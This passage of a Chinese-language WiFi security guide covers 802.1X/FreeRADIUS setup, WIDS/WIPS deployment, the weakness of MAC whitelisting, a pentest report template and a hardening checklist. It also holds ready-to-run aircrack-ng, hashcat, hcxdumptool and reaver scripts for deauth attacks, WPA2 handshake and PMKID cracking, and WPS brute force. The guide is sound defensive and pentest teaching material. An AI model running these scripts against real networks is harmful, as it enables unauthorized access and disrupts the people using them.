# 过渡模式（同时支持开放和 OWE）
owe_transition_ssid=OpenNetwork
owe_transition_bssid=00:11:22:33:44:55
```

### 4.2 企业级 802.1X

```
企业级 WiFi 认证方案：

架构组件：
├── Supplicant: 客户端设备
├── Authenticator: AP / 控制器
└── Authentication Server: RADIUS 服务器

EAP 方法对比：

EAP-TLS（推荐）：
├── 双向证书认证
├── 安全性最高
├── 需要管理客户端证书
├── 适合企业环境
└── 适用于高安全要求场景

PEAP-MSCHAPv2（常用）：
├── 服务器端证书 + 用户名密码
├── 部署较简单
├── 易受 Evil Twin 攻击
├── 客户端需验证服务器证书
└── 中等安全性

EAP-TTLS：
├── 类似 PEAP
├── 支持多种内层认证
└── 灵活性更高

EAP-SIM/AKA：
├── 使用 SIM 卡认证
├── 适用于移动运营商网络
└── 需要特殊硬件

FreeRADIUS 配置示例：
# /etc/freeradius/3.0/clients.conf
client wifi_ap {
    ipaddr = 192.168.1.0/24
    secret = shared_secret_key
    require_message_authenticator = yes
}

# /etc/freeradius/3.0/mods-enabled/eap
eap {
    default_eap_type = tls
    tls-config tls-common {
        private_key_file = /etc/freeradius/certs/server.key
        certificate_file = /etc/freeradius/certs/server.pem
        ca_file = /etc/freeradius/certs/ca.pem
        cipher_list = "DEFAULT"
        ecdh_curve = "secp384r1"
    }
    tls {
        config_section = "tls-common"
    }
    peap {
        default_eap_type = mschapv2
        copy_request_to_tunnel = yes
        use_tunneled_reply = yes
    }
}

# /etc/freeradius/3.0/users
# EAP-TLS 用户（基于证书）
"client-cert" TLS-Client-Cert-Subject == "CN=client-device" {
    Auth-Type = Accept
}

# PEAP 用户（用户名密码）
"user1" Cleartext-Password := "secure_password_123" {
    MS-CHAP-Use-NTLM-Auth = 0
}
```

### 4.3 WIDS/WIPS 部署

```
企业级 WIDS/WIPS 部署方案：

部署架构：
├── 传感器层: 专用无线传感器分布部署
├── 分析引擎: 集中式流量分析和威胁检测
├── 管理平台: 统一管理和告警
└── 集成接口: SIEM/NAC 集成

检测能力清单：
├── Rogue AP 检测
│   ├── 对比授权 AP 白名单
│   ├── 检测有线侧桥接
│   └── 自动分类和告警
├── Evil Twin 检测
│   ├── BSSID/SSID 冲突检测
│   ├── 信道异常检测
│   └── 信号强度异常
├── 无线钓鱼 AP
│   ├── 相似 SSID 检测
│   └── Captive Portal 检测
├── Ad-hoc 网络检测
├── 无线桥接检测
├── MAC 欺骗检测
├── Deauth 攻击检测
├── 未授权设备探测
└── 无线策略违规

响应能力：
├── 主动抑制: 发送 Deauth 切断非法连接
├── 自动定位: 三角定位非法设备
├── 端口关闭: 联动交换机关闭 Rogue AP 端口
├── 告警通知: 邮件/短信/SIEM
└── 取证记录: 保存无线流量用于取证

开源方案 - Kismet WIDS：
# Kismet 配置
source=wlan0:type=linuxwifi
alert_seqnum=true
detect_fakemac=true
deny_unique_mac_change=true
# 配置 Rogue AP 白名单
apcsvfile=/etc/kismet/known_aps.csv
# 告警配置
alert_emails=security@company.com
alert_smtp_server=smtp.company.com
```

### 4.4 MAC 白名单局限性

```
MAC 地址白名单分析：

工作原理：
├── AP 维护允许的 MAC 地址列表
├── 仅允许列表中的 MAC 关联
├── 通常作为附加安全层
└── 常被误认为是有效的安全措施

局限性分析：
├── MAC 地址在空中明文传输
│   └── 监听即可获得合法 MAC
├── MAC 地址可伪造
│   ├── Linux: ip link set dev wlan0 address XX:XX:XX:XX:XX:XX
│   ├── macOS: ifconfig wlan0 ether XX:XX:XX:XX:XX:XX
│   └── Windows: 注册表修改或专用工具
├── 管理开销大
│   ├── 需要维护 MAC 列表
│   ├── 设备更换需更新列表
│   └── 不适合大规模部署
├── 不提供加密保护
│   └── 即使 MAC 验证通过，数据仍需 WPA 加密
└── 无法防止 Rogue AP
    └── 攻击者可克隆合法 AP 的 MAC

正确使用方式：
├── 作为辅助安全层，不作为主要防护
├── 结合 802.1X 进行设备认证
├── 配合 NAC 进行设备合规检查
├── 使用设备指纹（不止 MAC）进行识别
└── 定期审计 MAC 白名单
```

---

## 5. 实战案例：Aircrack-ng 套件完整 WiFi 渗透流程

### 5.1 环境准备

```bash
#!/bin/bash
# WiFi 渗透测试环境准备脚本
# 注意：仅用于授权测试

# 1. 确认无线网卡支持监听模式和注入
iw phy phy0 info | grep -A 10 "monitor"
iw phy phy0 info | grep -A 10 "inject"

# 2. 安装必要工具
apt update
apt install -y aircrack-ng wireshark reaver bully hashcat

# 3. 确认无线网卡芯片
lsusb | grep -i wireless
iwconfig

# 4. 终止可能冲突的进程
airmon-ng check kill

# 5. 启用监听模式
airmon-ng start wlan0
# 确认监听接口已创建
iwconfig wlan0mon
```

### 5.2 完整渗透流程

```bash
#!/bin/bash
# 完整 WiFi 渗透测试流程
# 目标: WPA2-PSK 网络
# ============================================

# 阶段1: 侦察扫描
echo "=== 阶段1: 网络扫描 ==="
# 扫描所有可见网络
timeout 30 airodump-ng wlan0mon \
  --write-interval 1 \
  --output-format csv \
  -w /tmp/scan_results

# 分析扫描结果，选择目标
echo "扫描结果保存在 /tmp/scan_results-01.csv"
echo "请选择目标 AP 的 BSSID 和信道"

# 设置目标参数（示例值）
TARGET_BSSID="AA:BB:CC:DD:EE:FF"
TARGET_CHANNEL="6"
TARGET_SSID="TargetNetwork"
CLIENT_MAC="00:11:22:33:44:55"

# 阶段2: 针对性监听
echo "=== 阶段2: 针对性监听 ==="
airodump-ng -c $TARGET_CHANNEL \
  --bssid $TARGET_BSSID \
  -w /tmp/target_capture \
  --output-format pcap \
  wlan0mon &

AIRODUMP_PID=$!
sleep 5

# 阶段3: 获取握手包
echo "=== 阶段3: 获取握手包 ==="
# 方法A: 等待客户端自然连接
echo "等待自然握手包..."

# 方法B: 主动 Deauth 加速
echo "执行 Deauth 攻击..."
aireplay-ng -0 5 \
  -a $TARGET_BSSID \
  -c $CLIENT_MAC \
  wlan0mon

# 检查是否捕获到握手包
sleep 10
if grep -q "WPA handshake" /tmp/target_capture-01.csv; then
    echo "[+] 握手包捕获成功！"
else
    echo "[-] 未捕获到握手包，重试..."
    aireplay-ng -0 10 \
      -a $TARGET_BSSID \
      -c $CLIENT_MAC \
      wlan0mon
    sleep 10
fi

# 停止 airodump-ng
kill $AIRODUMP_PID

# 阶段4: 离线破解
echo "=== 阶段4: 离线密码破解 ==="

# 方法A: aircrack-ng + 字典
echo "使用 aircrack-ng 破解..."
aircrack-ng -w /usr/share/wordlists/rockyou.txt \
  -b $TARGET_BSSID \
  /tmp/target_capture-01.cap

# 方法B: 转换为 hashcat 格式（GPU 加速）
echo "转换为 hashcat 格式..."
aircrack-ng -J /tmp/hash /tmp/target_capture-01.cap
# 使用 hashcat 破解
hashcat -m 2500 /tmp/hash.hccapx /usr/share/wordlists/rockyou.txt

# 方法C: 使用 PMKID（如果目标支持）
echo "尝试 PMKID 攻击..."
hcxdumptool -i wlan0mon \
  --filterlist_ap=$TARGET_BSSID \
  --enable_status=1 \
  -o /tmp/pmkid.pcapng \
  --active_assoc

hcxpcaptool -z /tmp/pmkid_hash.txt /tmp/pmkid.pcapng
if [ -s /tmp/pmkid_hash.txt ]; then
    echo "[+] PMKID 获取成功"
    hashcat -m 16800 /tmp/pmkid_hash.txt /usr/share/wordlists/rockyou.txt
fi

echo "=== 渗透测试完成 ==="
```

### 5.3 WPS 攻击实战

```bash
#!/bin/bash
# WPS 攻击实战脚本
# ============================================

TARGET_BSSID="AA:BB:CC:DD:EE:FF"

# 方法1: Pixie Dust 攻击（不需要客户端）
echo "=== Pixie Dust WPS 攻击 ==="
reaver -i wlan0mon \
  -b $TARGET_BSSID \
  -c 6 \
  -K 1 \
  -vv \
  --pixie-dust

# 或使用 bully
bully wlan0mon \
  -b $TARGET_BSSID \
  -c 6 \
  -d \
  -v 3

# 方法2: 在线 PIN 爆破
echo "=== WPS PIN 在线爆破 ==="
reaver -i wlan0mon \
  -b $TARGET_BSSID \
  -c 6 \
  -vv \
  --pin=12345670  # 已知 PIN 或空爆破

# 注意事项：
# - Pixie Dust 攻击成功率约 20-30%
# - 在线爆破可能需要数小时
# - 部分 AP 有 WPS 锁定机制
# - 检测 WPS 锁定状态:
reaver -i wlan0mon -b $TARGET_BSSID -c 6 --scan
```

### 5.4 完整渗透报告模板

```
无线网络渗透测试报告

1. 执行摘要
   测试时间: 2026-09-XX
   测试范围: XX 公司办公区 WiFi 网络
   总体风险等级: [高/中/低]
   关键发现:
   - 发现 X 个安全漏洞
   - X 个高危漏洞
   - X 个中危漏洞
   - 建议: [关键改进建议]

2. 测试范围
   - 目标 SSID: [列表]
   - 物理范围: [区域描述]
   - 测试时间: [日期时间]
   - 授权文件: [引用]

3. 发现详情

   3.1 [漏洞名称]
   风险等级: 高
   描述: [详细描述]
   证据: [截图/日志]
   影响: [安全影响分析]
   复现步骤:
   1. [步骤1]
   2. [步骤2]
   3. [步骤3]
   修复建议: [具体修复方案]
   参考资料: [CVE/标准引用]

4. 修复优先级
   优先级1（立即修复）:
   - [高危漏洞列表]
   
   优先级2（30天内修复）:
   - [中危漏洞列表]
   
   优先级3（长期改进）:
   - [低危/建议项]

5. 附录
   - 测试工具版本
   - 完整扫描结果
   - 证据材料
```

---

## 6. 附录

### 6.1 802.11 信道频率表

```
2.4 GHz 频段：
信道  中心频率(MHz)  备注
 1       2412         中国可用
 2       2417
 3       2422
 4       2427
 5       2432
 6       2437         推荐不重叠信道
 7       2442
 8       2447
 9       2452
 10      2457
 11      2462
 12      2467         中国可用
 13      2472         中国可用
 14      2484         仅日本可用

5 GHz 频段（中国）：
信道  中心频率(MHz)  带宽    备注
 36      5180        20/40   UNII-1
 40      5200        20/40
 44      5220        20/40
 48      5240        20/40
 52      5260        20/40   DFS
 56      5280        20/40   DFS
 60      5300        20/40   DFS
 64      5320        20/40   DFS
149      5745        20/40   UNII-3
153      5765        20/40
157      5785        20/40
161      5805        20/40
165      5825        20
```

### 6.2 常用端口和协议

```
WiFi 相关端口和协议：

EAPoL (Extensible Authentication Protocol over LAN):
├── EtherType: 0x888E
├── 用于 802.1X 认证和密钥交换
└── 四次握手通过 EAPoL-Key 帧传输

RADIUS:
├── 认证端口: UDP 1812
├── 计费端口: UDP 1813
└── 旧标准: UDP 1645/1646

CAPWAP (Control and Provisioning of Wireless Access Points):
├── 数据端口: UDP 5247
├── 控制端口: UDP 5246
└── 用于 AP 与控制器通信

HTTP/HTTPS (Captive Portal):
├── HTTP: TCP 80
├── HTTPS: TCP 443
└── Portal 重定向页面
```

### 6.3 安全检查清单

```
WiFi 安全检查清单：

基础配置:
[ ] 使用 WPA3（或至少 WPA2-AES）
[ ] 禁用 WEP 和 WPA-TKIP
[ ] 禁用 WPS 功能
[ ] 修改默认管理员密码
[ ] 修改默认 SSID
[ ] 禁用远程管理
[ ] 更新最新固件

企业安全:
[ ] 部署 802.1X 认证
[ ] 使用 EAP-TLS 双向证书认证
[ ] 配置 RADIUS 服务器冗余
[ ] 部署 WIDS/WIPS
[ ] VLAN 隔离无线网络
[ ] 配置防火墙策略
[ ] 定期安全审计

客户端安全:
[ ] 配置证书验证
[ ] 禁用自动连接未知网络
[ ] 使用 VPN 加密无线流量
[ ] 定期更新驱动和固件
[ ] 启用 PMF（管理帧保护）

物理安全:
[ ] AP 部署在安全位置
[ ] 控制信号覆盖范围
[ ] 有线侧端口安全
[ ] 定期物理巡查
```

---

> **免责声明**：本文档仅供学习和研究使用。所有攻击技术仅在授权测试环境中演示。未经授权对他人无线网络进行攻击是违法行为，可能面临刑事处罚。请始终遵守《网络安全法》及相关法律法规。

---

*最后更新：2026年9月*
